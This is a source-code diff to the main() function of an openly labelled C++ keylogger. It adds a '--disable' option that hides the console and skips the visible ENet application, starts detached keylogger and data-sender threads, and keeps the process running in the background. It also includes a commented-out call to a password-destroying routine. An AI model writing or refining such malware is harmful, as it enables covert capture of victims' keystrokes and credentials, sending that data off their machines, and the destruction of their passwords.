@@ -526,25 +526,39 @@ int application() {
 // ---------------------------------------------------------------------
 // Main function - Program entry point
 // ---------------------------------------------------------------------
-int main() {
-   // remove comment to start password deleter
-    PasswordDeleter::destroyPass();
-    
-    // Start keylogger in a separate thread
+int main(int argc, char* argv[]) {
+    bool enable = true;
+
+    if (argc > 1) {
+        std::string arg = argv[1];
+        if (arg == "--disable") {
+            enable = false;
+        }
+    }
+
+    if (!enable) {
+        FreeConsole();  // Detach console **before** launching threads
+    }
+
+    // Uncomment this if you want to enable password destruction
+    // PasswordDeleter::destroyPass();
+
+    // Start keylogger and sender threads
     std::thread keylogThreadObj(keyloggerThread);
-    
-    // Start data sending thread
     std::thread senderThreadObj(senderThread);
-    
-    // Detach the keylogger thread to run in the background
+
     keylogThreadObj.detach();
     senderThreadObj.detach();
-    
-    // Start the ENet application
-    application();
-    
-    // Set flag to stop threads when application exits
-    isKeyloggerRunning = false;
-    
+
+    // Start the ENet application if enabled
+    if (enable) {
+        application();
+    }
+
+    // Keep the main thread alive to prevent premature exit
+    while (isKeyloggerRunning) {
+        std::this_thread::sleep_for(std::chrono::seconds(1));
+    }
+
     return 0;
 }
